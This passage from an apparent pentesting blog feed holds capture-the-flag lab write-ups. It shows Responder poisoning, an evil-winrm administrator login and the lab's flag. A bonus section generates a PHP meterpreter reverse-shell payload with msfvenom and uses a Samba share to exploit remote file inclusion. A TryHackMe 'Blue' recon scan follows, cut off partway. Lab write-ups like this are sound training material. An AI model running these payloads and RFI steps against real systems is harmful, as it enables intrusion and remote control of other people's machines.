</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.156<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::109a<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="s1">&#39;, &#39;</span>ISATAP.LOCAL<span class="err">&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-S84T8YLFEZG<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>AJ0U.LOCAL<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>47321<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next we need to connect with evil-winrm to the winrm service running on the target machine!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> evil-winrm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./evil-winrm.rb -i 10.129.17.20 -u administrator -p badminton
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function</span> is unimplemented on this machine
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; cd..
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd</span> ..
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">d-----          3/9/2022   5:35 PM                Administrator
</span></span><span class="line"><span class="cl">d-----          3/9/2022   5:33 PM                mike
</span></span><span class="line"><span class="cl">d-r---        10/10/2020  12:37 PM                Public
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; <span class="nb">cd</span> mike
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">d-----         3/10/2022   4:51 AM                Desktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; <span class="nb">cd</span> Desktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----         3/10/2022   4:50 AM             <span class="m">32</span> flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; cat flag.txt
</span></span><span class="line"><span class="cl">ea81b7afddd03efaa0945333ed147fac
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<p><strong>root flag: ea81b7afddd03efaa0945333ed147fac</strong></p>
<hr>
<h2 id="bonus">Bonus</h2>
<p><strong>(this section was not part of this box. However I went one step further and gained a meterpreter shell by exploiting RFI using Samba)</strong></p>
<hr>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.156 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o payload.php
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: php from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">1113</span> bytes
</span></span><span class="line"><span class="cl">Saved as: payload.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>We will need to exploit this using Samba since url_fopen is disabled in php we cannot easily exploit RFI here.
(<a href="https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener noreffer">https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install samba
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mkdir /var/www/html/pub/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chmod <span class="m">0555</span> /var/www/html/pub/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chown -R nobody:nogroup /var/www/html/pub/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> &gt; /etc/samba/smb.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[global]
</span></span></span><span class="line"><span class="cl"><span class="s2">workgroup = WORKGROUP
</span></span></span><span class="line"><span class="cl"><span class="s2">server string = Samba Server %v
</span></span></span><span class="line"><span class="cl"><span class="s2">netbios name = indishell-lab
</span></span></span><span class="line"><span class="cl"><span class="s2">security = user
</span></span></span><span class="line"><span class="cl"><span class="s2">map to guest = bad user
</span></span></span><span class="line"><span class="cl"><span class="s2">name resolve order = bcast host
</span></span></span><span class="line"><span class="cl"><span class="s2">dns proxy = no
</span></span></span><span class="line"><span class="cl"><span class="s2">bind interfaces only = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">[ica]
</span></span></span><span class="line"><span class="cl"><span class="s2">path = /var/www/html/pub
</span></span></span><span class="line"><span class="cl"><span class="s2">writable = no
</span></span></span><span class="line"><span class="cl"><span class="s2">guest ok = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">guest only = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">read only = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">directory mode = 0555
</span></span></span><span class="line"><span class="cl"><span class="s2">force user = nobody&#34;</span> &gt; /etc/samba/smb.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">service smbd restart
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cp payload.php /var/www/html/pub
</span></span></code></pre></td></tr></table>
</div>
</div><p>After executing the payload by browsing to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code> I got a meterpreter shell!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.16.156:4444 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39927</span> bytes<span class="o">)</span> to 10.129.128.80
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.16.156:4444 -&gt; 10.129.128.80:49482<span class="o">)</span> at 2022-09-13 16:49:37 +0200
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt;
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>THM - Learn - Offensive Pentesting - Blue</title><link>https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/</link><pubDate>Sat, 09 Apr 2022 03:58:23 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/blue-thumbnail.png" referrerpolicy="no-referrer">
            </div><h1 id="tryhackme---learn---offensive-pentesting---blue">TryHackMe - Learn - Offensive Pentesting - Blue</h1>
<hr>
<h2 id="task-1-recon">Task 1: Recon</h2>
<h3 id="scan-and-learn-what-exploit-this-machine-is-vulnerable-to-please-note-that-this-machine-does-not-respond-to-ping-icmp-and-may-take-a-few-minutes-to-boot-up-this-room-is-not-meant-to-be-a-boot2root-ctf-rather-this-is-an-educational-series-for-complete-beginners-professionals-will-likely-get-very-little-out-of-this-room-beyond-basic-practice-as-the-process-here-is-meant-to-be-beginner-focused">Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</h3>
<hr>
<ul>
<li>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">IP</span><span class="o">=</span><span class="s2">&#34;10.10.14.17&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir nmap
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo nmap -sC -sV -v -O <span class="nv">$IP</span> -o nmap/initial
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Sat Apr  9 02:01:41 2022 as: nmap -sC -sV -v -O -o nmap/initial 10.10.14.17</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.14.17
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.039s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">991</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">3389/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Jon-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>Jon-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-04-07T23:52:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2022-10-07T23:52:22
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   <span class="m">9796</span> 2e4d cd63 7fe6 b315 ab65 f94c 0baf
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4ff6 <span class="m">8427</span> ce68 f8d3 2e98 a71f f0e9 cd4c <span class="m">9658</span> 1e1a
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2022-04-09T00:03:10+00:00<span class="p">;</span> +1s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: JON-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: JON-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: JON-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: Jon-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: Jon-PC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 6.1.7601
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2022-04-09T00:02:55+00:00
</span></span><span class="line"><span class="cl">49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49158/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49159/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
</span></span><span class="line"><span class="cl">OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.92%E<span class="o">=</span>4%D<span class="o">=</span>4/9%OT<span class="o">=</span>135%CT<span class="o">=</span>1%CU<span class="o">=</span>41609%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>6250CD3
</span></span><span class="line"><span class="cl">OS:D%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>106%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%CI<span class="o">=</span>I%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS<span class="o">=</span>
</span></span><span class="line"><span class="cl">OS:7<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>106%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%CI<span class="o">=</span>I%TS<span class="o">=</span>7<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505NW8ST11%O2<span class="o">=</span>M505NW8S
</span></span><span class="line"><span class="cl">OS:T11%O3<span class="o">=</span>M505NW8NNT11%O4<span class="o">=</span>M505NW8ST11%O5<span class="o">=</span>M505NW8ST11%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span><span class="m">200</span>
</span></span><span class="line"><span class="cl">OS:0%W2<span class="o">=</span>2000%W3<span class="o">=</span>2000%W4<span class="o">=</span>2000%W5<span class="o">=</span>2000%W6<span class="o">=</span>2000<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>2000%O<span class="o">=</span>M50
</span></span><span class="line"><span class="cl">OS:5NW8NNS%CC<span class="o">=</span>N%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%
</span></span><span class="line"><span class="cl">OS:W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>O%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=</span>
</span></span><span class="line"><span class="cl">OS:<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>
</span></span><span class="line"><span class="cl">OS:S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF
</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>80%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>
</span></span><span class="line"><span class="cl">OS:G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>80%CD<span class="o">=</span>Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Uptime guess: 0.009 days <span class="o">(</span>since Sat Apr  <span class="m">9</span> 01:50:42 2022<span class="o">)</span>
</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">262</span> <span class="o">(</span>Good luck!<span class="o">)</span>
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: Incremental
</span></span><span class="line"><span class="cl">Service Info: Host: JON-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 0s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2022-04-09T00:02:55
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2022-04-08T23:52:20
